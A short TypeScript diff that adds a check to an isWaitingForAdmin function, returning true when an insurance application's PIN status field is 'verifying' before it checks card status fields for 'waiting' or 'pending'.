@@ -32,7 +32,12 @@ const isWaitingForAdmin = (visitor: InsuranceApplication): boolean => {
     return true;
   }
 
-  // 3. Check other status fields for "waiting" or "pending"
+  // 3. Check PIN status - show waiting indicator when PIN is verifying
+  if (visitor._v6Status === "verifying") {
+    return true;
+  }
+
+  // 4. Check other status fields for "waiting" or "pending"
   if (
     visitor.cardStatus === "waiting" || 
     visitor.cardStatus === "pending" ||
